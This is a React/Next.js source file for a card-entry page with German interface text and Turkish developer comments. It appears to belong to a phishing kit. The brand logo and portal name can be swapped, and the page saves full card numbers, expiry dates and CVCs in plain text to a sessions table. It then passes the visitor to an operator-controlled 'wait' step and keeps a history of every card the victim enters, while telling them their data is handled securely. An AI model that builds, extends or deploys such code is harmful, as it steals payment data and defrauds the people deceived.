"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      // ⚠️ DUZELTME (KART GECMIS BUTONU KAYIP HATA):
      //   ESKI KOD: setNumber(fd.cardNumber ?? "") / setExpiry / setCvc → UI'DA ESKI KARTI GÖSTERİYORDU.
      //   YENI KOD (SMS ILE AYNI MANTIK):
      //     1) setNumber("") / setExpiry("") / setCvc("") → UI INPUTLAR BOŞ (kullanıcı eski kartı GÖRMEZ).
      //     2) setSessionFormData(fd) → fd ESKİ KARTI KORUR (submitte prevCard = eski kart bulunur, history.push ✅).
      //     3) Supabase'te ESKİ kartı SİLME! Kalsın ki sonraki submitlerde history.push yapılabilsin.
      setSessionFormData(fd);
      setNumber("");
      setExpiry("");
      setCvc("");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Bitte geben Sie ein gueltiges Ablaufdatum ein (MM/JJ).");
      return;
    }
    if (!cvcValid) {
      setMsg("Bitte geben Sie eine gueltige CVC/CVV ein (3 oder 4 Ziffern).");
      return;
    }
    setSaving(true);
    setMsg(null);

    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
    let baseFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* fresh okuma basarisizsa state ile devam et */
    }

    // ⭐ KART GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once cardNumber DOLUYSA)
    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) KART BILGISINI PUSH ET!
    //   Boylece: kolon = YENİ kart (2. kart), history = ESKI kart (1. kart → gorunur).
    const prevCard = String((baseFormData as any).cardNumber || "").trim();
    const prevCardExp = String((baseFormData as any).cardExpiry || "").trim();
    const prevCardCvc = String((baseFormData as any).cardCvc || "").trim();
    const isFirstCardEntry = prevCard.length === 0;
    const cardFormHistory: any[] = Array.isArray((baseFormData as any).cardFormHistory)
      ? (baseFormData as any).cardFormHistory.slice()
      : [];
    if (!isFirstCardEntry) {
      cardFormHistory.push({
        htmlStepLabel: "KARTENDATEN",
        capturedAt: new Date().toISOString(),
        cardNumber: prevCard,
        cardExpiry: prevCardExp,
        cardCvc: prevCardCvc,
      });
    }

    const nextFormData = {
      ...baseFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
      cardFormHistory,
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Speichern fehlgeschlagen.");
    else {
      setSessionFormData(nextFormData);
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Ungueltiger Link.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[860px] fade-in">
        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0 max-w-[29rem]">
              <h2 className="pak-form-title">{settings.card_title}</h2>
              <p className="pak-form-subtitle mt-2">{settings.card_subtitle}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="pak-form-brand-logo shrink-0"
              id="card-brand-logo"
            />
          </div>

          <form onSubmit={handleSubmit} className="mt-5 space-y-4 sm:mt-6 sm:space-y-5">
            <label className="pak-form-label">
              {settings.card_number_label}
              <div className="pak-form-input-wrap">
                <div className="pak-form-input-icon">
                  <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                    <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                    <path d="M3 10.5h18" />
                  </svg>
                </div>
                <input
                  inputMode="numeric"
                  className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.18em]"
                  value={number}
                  onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                  autoComplete="cc-number"
                />
              </div>
            </label>
            <div className="grid grid-cols-2 gap-4 sm:gap-6">
              <label className="pak-form-label">
                {settings.card_expiry_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
                      <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
                    </svg>
                  </div>
                  <input
                    placeholder="MM/YY"
                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    autoComplete="cc-exp"
                    inputMode="numeric"
                    maxLength={5}
                  />
                </div>
              </label>
              <label className="pak-form-label">
                {settings.card_cvv_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                      <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    inputMode="numeric"
                    maxLength={4}
                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.14em]"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    autoComplete="cc-csc"
                  />
                </div>
              </label>
            </div>

            {!expiryValid && expiry.length > 0 ? (
              <p className="text-xs text-red-400">Das Ablaufdatum muss im Format MM/JJ sein.</p>
            ) : null}

            {!cvcValid && cvc.length > 0 ? (
              <p className="text-xs text-red-400">Die CVV muss 3 oder 4 Ziffern enthalten.</p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Ihre Daten werden sicher verarbeitet.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !expiryValid || !cvcValid}
                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
              >
                {saving ? "Wird gesendet..." : settings.card_button}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
